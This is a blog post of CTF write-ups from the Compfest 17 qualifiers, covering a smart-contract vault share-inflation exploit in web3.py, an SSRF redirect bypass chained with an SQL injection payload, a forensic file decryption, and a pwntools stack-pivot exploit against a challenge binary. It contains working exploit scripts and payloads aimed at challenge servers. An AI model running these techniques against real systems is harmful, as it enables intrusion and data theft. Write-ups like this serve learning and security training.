---
date: 2025-09-02 18:03:00
layout: post
title: Compfest 17 Quals
subtitle: Have fun at the national CTF
description: ikut untuk kedua kalinya di ctf compfest
image: https://images6.alphacoders.com/135/1355194.jpeg
optimized_image: https://images6.alphacoders.com/135/1355194.jpeg
category: ctf
tags:
  - pwn
  - bof
  - foren
  - blockchain
  - web
author: --
---

I played for the team lastseenin2026 and finished in 20th place. 
This is when the scoreboard was frozen. This write-up is incomplete because I only wrote what I had finished.

# Phantom-Thieves (Blockchain)
## Description

> Let's infiltrate this place and make the greedy king got trapped!!

## Overview
Two attachments are provided: **Fortress.sol** and **Setup.sol**.
The main vulnerability lies in the Vault contract, specifically in how the deposit function calculates shares. 
This function calculates the number of new shares based on the token balance in the vault before new tokens from users enter.

## Solver
Step by step to exploit

- The attacker first makes a small deposit to obtain an initial number of shares in the vault. 
- After obtaining the initial shares, the attacker purchased a large number of *PhantomCoin* tokens. However, instead of depositing the tokens, the attacker transferred them directly to the Vault contract address.
- Due to the inflation of the balance, the calculation ratio in the *openVault()* function becomes invalid. The calculated wouldMint value will fall to zero because the integer division result has a smaller numerator than the denominator. This condition automatically triggers a NoShares() error. Thus, the isSolved() function will return a true value in accordance with the challenge objective.

### Exploit
```python
from web3 import Web3
import json

RPC_URL = "http://ctf.compfest.id:7401/e4c53161-3565-4b30-bc8b-8cd24f82a5ad"
ATTACKER_PRIVATE_KEY = "f3988499fd7ac9e273bbdb180685a1cd96b74b142dc1df73c7055f552bd6f30f"
SETUP_CONTRACT_ADDRESS = "0xB2838D80b2bc8D9E7284d7B6bE2bc194Ff4e574A"
WALLET_ADDR = "0x7734785884951636907fB4677D5CB12B14Ab61cb"

try:
    with open('Fortress.json') as f:
        FORTRESS_ABI = json.load(f)
    with open('PhantomCoin.json') as f:
        PHTM_ABI = json.load(f)
    with open('Vault.json') as f:
        VAULT_ABI = json.load(f)
    with open('Setup.json') as f:
        SETUP_ABI = json.load(f)
except FileNotFoundError:
    print("Error: Pastikan file ABI (.json) ada di folder yang sama dengan skrip ini.")
    exit()
except json.JSONDecodeError:
    print("Error: Ada masalah saat membaca file JSON. Pastikan isinya valid.")
    exit()
# --- AKHIR KONFIGURASI ---


# 1. Koneksi ke Blockchain
w3 = Web3(Web3.HTTPProvider(RPC_URL))
if not w3.is_connected():
    print("Gagal terhubung ke node blockchain!")
    exit()

attacker_account = w3.eth.account.from_key(ATTACKER_PRIVATE_KEY)
w3.eth.default_account = attacker_account.address
print(f"Berhasil terhubung. Alamat Attacker: {attacker_account.address}")

setup_contract = w3.eth.contract(address=SETUP_CONTRACT_ADDRESS, abi=SETUP_ABI)

challenge_address = setup_contract.functions.challenge().call()
challenge_contract = w3.eth.contract(address=challenge_address, abi=FORTRESS_ABI)

token_address = challenge_contract.functions.token().call()
token_contract = w3.eth.contract(address=token_address, abi=PHTM_ABI)

vault_address = challenge_contract.functions.vault().call()
vault_contract = w3.eth.contract(address=vault_address, abi=VAULT_ABI)

print(f"Alamat kontrak Fortress: {challenge_address}")
print(f"Alamat kontrak Token: {token_address}")
print(f"Alamat kontrak Vault: {vault_address}")

def send_tx(tx):
    tx['chainId'] = w3.eth.chain_id
    tx['gas'] = w3.eth.estimate_gas(tx)
    tx['maxFeePerGas'] = w3.eth.gas_price * 2
    tx['maxPriorityFeePerGas'] = w3.to_wei(1, 'gwei')

    signed_tx = w3.eth.account.sign_transaction(tx, ATTACKER_PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)

    print(f"Mengirim transaksi, hash: {tx_hash.hex()}. Menunggu konfirmasi...")
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
    print("Transaksi berhasil!")
    return tx_receipt

print("\n--- Memulai Eksploitasi ---")

print("\n[LANGKAH 1] Melakukan deposit awal sebesar 1 wei...")
tx_buy_initial = token_contract.functions.buyTokens().build_transaction({
    'from': attacker_account.address,
    'nonce': w3.eth.get_transaction_count(attacker_account.address),
    'value': 1
})
send_tx(tx_buy_initial)

tx_approve = token_contract.functions.approve(vault_address, 1).build_transaction({
    'from': attacker_account.address,
    'nonce': w3.eth.get_transaction_count(attacker_account.address),
})
send_tx(tx_approve)

tx_deposit = vault_contract.functions.deposit(1).build_transaction({
    'from': attacker_account.address,
    'nonce': w3.eth.get_transaction_count(attacker_account.address),
})
send_tx(tx_deposit)
print("Deposit awal berhasil. Total shares sekarang > 0.")

print("\n[LANGKAH 2 & 3] Membeli banyak token dan mentransfer langsung ke Vault...")
attack_amount = w3.to_wei(0.5, 'ether')

tx_buy_attack = token_contract.functions.buyTokens().build_transaction({
    'from': attacker_account.address,
    'nonce': w3.eth.get_transaction_count(attacker_account.address),
    'value': attack_amount
})
send_tx(tx_buy_attack)

tx_inflate = token_contract.functions.transfer(vault_address, attack_amount).build_transaction({
    'from': attacker_account.address,
    'nonce': w3.eth.get_transaction_count(attacker_account.address),
})
send_tx(tx_inflate)
print("Balance vault berhasil diinflasi!")

is_solved = setup_contract.functions.isSolved().call()

if is_solved:
    print("\n✅ SELAMAT! Tantangan berhasil diselesaikan!")
else:
    print("\n❌ GAGAL! Tantangan belum selesai.")

```

# Dark Side Of Asteroid (Web Exploitation)
## Description

> something seems wrong???

## Overview
An attachment was provided with the following content:

### app.py
```python
@app.route('/profile', methods=['GET', 'POST'])
def profile():
    if 'username' not in session:
        return redirect(url_for('login'))

    conn = get_db_connection()
    error_preview = None
    content_type = ''

    if request.method == 'POST':
        photo_url = request.form['photo_url']
        try:
            if is_private_url(photo_url):

                  raise Exception("Direct access to internal host is forbidden.")

            os.makedirs(os.path.join('static', 'uploads'), exist_ok=True)

            resp = requests.get(photo_url, timeout=5)
            content_type = resp.headers.get('Content-Type', '')
            filename = f"{session['username']}_profile_fetched"
            filepath = os.path.join('static', 'uploads', filename)

# -------SNIPPET----------

@app.route('/internal/admin/search')
def internal_admin_search():
    if request.remote_addr != '127.0.0.1':
        return "Access denied", 403

    conn = get_db_connection()
    try:
        search_raw = request.args.get('q', '')
        if search_raw == '':
            query = "SELECT secret_name, secret_value FROM admin_secrets WHERE access_level <= 2"
        else:
            search = filter_sqli(search_raw)
            query = f"SELECT secret_name, secret_value FROM admin_secrets WHERE secret_name LIKE '{search}' AND access_level <= 2"

        rows = conn.execute(query).fetchall()

        result = ''
        for row in rows:
            result += f"{row['secret_name']}: {row['secret_value']}\n"
        if not result:
            result = "No secrets found"

        return result, 200, {'Content-Type': 'text/plain; charset=utf-8'}
    except Exception as e:
        return f"Error: {str(e)}"
    finally:
        conn.close()

def is_private_url(url: str):
    hostname = urlparse(url).hostname
    if not hostname:
        return True
    ip = socket.gethostbyname(hostname)
    return ipaddress.ip_address(ip).is_private

# -------SNIPPET----------
```

## solution
**resp = requests.get(photo_url, timeout=5)** will cause the server to make an HTTP request to the URL we provide. This is an SSRF vulnerability. There is an **is_private_url(photo_url)** filter that prevents direct access to internal IP addresses such as 127.0.0.1. However, this filter can be bypassed using HTTP Redirect. The check is only performed on the initial URL, not on the destination URL after the redirect.

**query = "SELECT secret_name, secret_value FROM admin_secrets WHERE access_level <= 2"** This is an SQL injection vulnerability in /internal/admin/search. This endpoint can only be accessed from 127.0.0.1 (localhost), so we have to use SSRF to reach it. The search parameter is entered directly into the query string, so we can “escape” the LIKE string and modify the query. 

**Blacklist:** Prohibits words such as union, or, select, and spaces ( ).

**Required:** Our payload must contain the string “access_level”
so the payload will be like this *http://127.0.0.1:5000/internal/admin/search?q=%25%27%0A--access_level*

### solve.py
```python
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/')
def do_redirect():
    target_url = "http://127.0.0.1:5000/internal/admin/search?q=%25%27%0A--access_level"
    print(f"Menerima request, me-redirect ke: {target_url}")
    return redirect(target_url, code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

# Crashout (Forensic) Upsolved
## Description
> Evan installed and executed a supposedly safe file. It caused his laptop to hang, several data to become corrupted, and new password-protected files to show up. The password popped up for a while, but I didn't memorize it. Can you get me back my file?

## Initial Analysis
We are given a dump.ad1 file in this challenge. which contains a strange downloaded file
i using autospy to open the dump.ad1, and found a strange .zip file containing script.py
![Gambar 1, File aneh]({{ site.baseurl }}/assets/img/uploads/compfest17quals/1.png)

and I also found an encrypted file
![Gambar 2,]({{ site.baseurl }}/assets/img/uploads/compfest17quals/2.png)

I suspect that file.enc is the flag because that is our goal, to find the corrupt file. But that strange .zip file has a password, so we need to find out where that password is.
I almost gave up looking for the password because I'm still a beginner at this. until I realized there was a dump file at /ProgramData/dumps.
![Gambar 3]({{ site.baseurl }}/assets/img/uploads/compfest17quals/3.png)

After that, I extracted the strange zip file, file.enc and chrome dump, and searched for the password with strings.
![Gambar 4]({{ site.baseurl }}/assets/img/uploads/compfest17quals/4.png)
![Gambar 5]({{ site.baseurl }}/assets/img/uploads/compfest17quals/5.png)
and found the password is **whereourcrashis**
After that, I tried to open the zip file and read script.py, which contained the following:
### script.py
```python
import sys
import hashlib
import getpass

HEADER_SIZE = 16
def derive_key(password: str, length: int = 32) -> bytes:
    return hashlib.sha256(password.encode()).digest()[:length]

def transform(byte, key_byte, i):
    xored = byte ^ key_byte
    rotation = i % 3
    return ((xored << rotation) | (xored >> (8 - rotation))) & 0xFF

def encrypt(input_file, output_file, password):
    key = derive_key(password)

    with open(input_file, 'rb') as f:
        data = f.read()

    encrypted = bytearray(data[:HEADER_SIZE])

    for i, byte in enumerate(data[HEADER_SIZE:], start=HEADER_SIZE):
        key_byte = key[i % len(key)] ^ (i & 0x0F)
        encrypted.append(transform(byte, key_byte, i))

    with open(output_file, 'wb') as f:
        f.write(encrypted)

    print(f"Encrypted {input_file} -> {output_file}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage:")
        print("python3 script.py encrypt input.jpg output.enc")
        sys.exit(1)

    mode, input_file, output_file = sys.argv[1:4]
    password = getpass.getpass("Enter password: ")

    if mode == "encrypt":
        encrypt(input_file, output_file, password)
    else:
        print("Invalid")
```

Sure enough, this script creates files with the .enc extension, such as file.enc. After that, I created a decryption key from this script to open the .enc file that was found earlier.
### dec.py
```python
import sys
import hashlib
import getpass

HEADER_SIZE = 16

def derive_key(password: str, length: int = 32) -> bytes:
    return hashlib.sha256(password.encode()).digest()[:length]

def reverse_transform(encrypted_byte, key_byte, i):
    """Membalikkan proses 'transform' dari skrip enkripsi."""
    rotation = i % 3
    # Lakukan rotasi ke kanan (kebalikan dari rotasi ke kiri)
    rotated_byte = ((encrypted_byte >> rotation) | (encrypted_byte << (8 - rotation))) & 0xFF
    # Lakukan XOR lagi untuk mendapatkan byte asli
    original_byte = rotated_byte ^ key_byte
    return original_byte

def decrypt(input_file, output_file, password):
    """Fungsi utama untuk mendekripsi file."""
    key = derive_key(password)

    with open(input_file, 'rb') as f:
        data = f.read()

    # Salin 16 byte pertama (header) apa adanya
    decrypted = bytearray(data[:HEADER_SIZE])

    # Proses sisa byte dari file, dimulai dari posisi ke-16
    for i, byte in enumerate(data[HEADER_SIZE:], start=HEADER_SIZE):
        # Buat key_byte yang sama persis seperti saat enkripsi
        key_byte = key[i % len(key)] ^ (i & 0x0F)
        # Panggil fungsi reverse_transform untuk mendapatkan byte asli
        decrypted.append(reverse_transform(byte, key_byte, i))

    with open(output_file, 'wb') as f:
        f.write(decrypted)

    print(f"Decrypted {input_file} -> {output_file}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage:")
        print("python3 decrypt.py decrypt input.enc output.jpg")
        sys.exit(1)

    mode, input_file, output_file = sys.argv[1:4]
    password = getpass.getpass("Enter password: ")

    if mode == "decrypt":
        decrypt(input_file, output_file, password)
    else:
        print("Invalid mode. Use 'decrypt'.")
```

Alhamdulillah, the zip password is the same as the password for decrypting this file.enc, until we get a cropped photo, so we need to make a few adjustments and get this photo.
![Gambar 5]({{ site.baseurl }}/assets/img/uploads/compfest17quals/flag.jpg)

# Neural Evil (pwn)
i solve this chall 1 day after the competition bcs i have a sick after competition :(
## Description
> What? Is this DnD? (p.s. the DM seems to be hiding something in his logs)

## Initial Analysis
![Gambar 6]({{ site.baseurl }}/assets/img/uploads/compfest17quals/6.png)
no pie and canary on

## Code Analysis
```c
void start(void)
{
  undefined local_28 [32];
 
  printf("Cleric: what should we call you? ");
  read(0,local_28,32);
  printf("Everyone: welcome to our party %s",local_28);
  encounter();
  cleaner();
  return;
}
```
in function start we get the leak of stack because **printf("… %s", buf)** over-reads past buf until a NUL is encountered. The next bytes on the stack are start’s saved RBP
and 
```c
void encounter(void)
{
  long unaff_retaddr;
  char local_28 [32];
 
  dm_secret = unaff_retaddr;
  puts("DM: Your party stumbles upon an angry demigod.");
  puts("DM: You have 10 seconds to do something that gets your party out alive");
  printf("You do: ");
  alarm(10);
  fgets(local_28,80,stdin);
  alarm(0);
  if (unaff_retaddr != dm_secret) {
    puts("DM: The god of nature swats you for disturbing the flow of nature");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  return;
}
```
In the ecounter function, there is a buffer overflow, but there is a check or custom check where the saved **RIP** must be a cleaner function.

```bash
Breakpoint 1, 0x0000000000401401 in encounter ()
------- tip of the day (disable with set show-tips off) -------
Use vmmap -A|-B <number> <filter> to display <number> of maps after/before filtered ones
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
 RAX  0xa
 RBX  0x7ffe01097f48 —▸ 0x7ffe01098d7c ◂— '/mnt/d/ctf/compfest17/quals/pwn/neutral_evil/chall'
 RCX  0x7e7259d222b7 (alarm+7) ◂— cmp rax, -0xfff
 RDX  0xfbad208b
 RDI  0
 RSI  0x7e7259e2c963 (_IO_2_1_stdin_+131) ◂— 0xe2e7c0000000000a /* '\n' */
 R8   0
 R9   0
 R10  0
 R11  0x202
 R12  0
 R13  0x7ffe01097f58 —▸ 0x7ffe01098daf ◂— 'SHELL=/bin/bash'
 R14  0x7e7259e80000 (_rtld_global) —▸ 0x7e7259e81310 ◂— 0
 R15  0x403df0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011d0 (__do_global_dtors_aux) ◂— endbr64
 RBP  0x7ffe01097de0 —▸ 0x7ffe01097df0 ◂— 0x414141414141000a /* '\n' */
 RSP  0x7ffe01097dc0 ◂— 0x4141414141414141 ('AAAAAAAA')
 RIP  0x401401 (encounter+98) ◂— mov rax, qword ptr [rbp + 8]
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
 ► 0x401401 <encounter+98>     mov    rax, qword ptr [rbp + 8]          RAX, [0x7ffe01097de8] => 0x401473 (start+72) ◂— call 0x401378
   0x401405 <encounter+102>    mov    rdx, rax                          RDX => 0x401473 (start+72) ◂— call 0x401378
   0x401408 <encounter+105>    mov    rax, qword ptr [rip + 0x2cc1]     RAX, [dm_secret] => 0x401473 (start+72) ◂— call 0x401378
   0x40140f <encounter+112>    cmp    rdx, rax                          0x401473 - 0x401473     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ac ]
   0x401412 <encounter+115>  ✔ je     encounter+137               <encounter+137>
    ↓
   0x401428 <encounter+137>    nop
   0x401429 <encounter+138>    leave
   0x40142a <encounter+139>    ret                                <start+72>
    ↓
   0x401473 <start+72>         call   cleaner                     <cleaner>

b+ 0x401478 <start+77>         nop
   0x401479 <start+78>         leave
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffe01097dc0 ◂— 0x4141414141414141 ('AAAAAAAA')
... ↓        3 skipped
04:0020│ rbp 0x7ffe01097de0 —▸ 0x7ffe01097df0 ◂— 0x414141414141000a /* '\n' */
05:0028│+008 0x7ffe01097de8 —▸ 0x401473 (start+72) ◂— call cleaner
06:0030│+010 0x7ffe01097df0 ◂— 0x414141414141000a /* '\n' */
07:0038│+018 0x7ffe01097df8 ◂— 0x4141414141414141 ('AAAAAAAA')
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► 0         0x401401 encounter+98
   1         0x401473 start+72
   2 0x4141414141414141 None
   3 0x4141414141414141 None
   4 0x4141414141414141 None
   5   0x7ffe01097e30 None
   6         0x40149c main+33
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>
```
final strategy is
leak → compute pivot RBP (−0x40) → preserve encounter ret → plant ret; read_log → win...

### solve.py
```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or 'chall')
context.terminal = ['wt.exe','wsl.exe']

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOT:
        return remote('ctf.compfest.id',7004)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
break *0x401401
break *0x401478
continue
'''.format(**locals())
 
p = start()
name = b'A'*32
p.send(name)
p.recvuntil(b'A'*32)
leak = u64(p.recv(6).ljust(8,b'\x00')) - 0x40
print(f'saved rbp leak @ {hex(leak)}')

payload = b'A'*0x20
payload += p64(leak)
payload += p64(0x401473)
payload += b'C'*0x8
payload += p64(0x401016)
payload += p64(0x401206)
p.recvuntil(b'You do: ')
p.sendline(payload)
p.interactive()
```
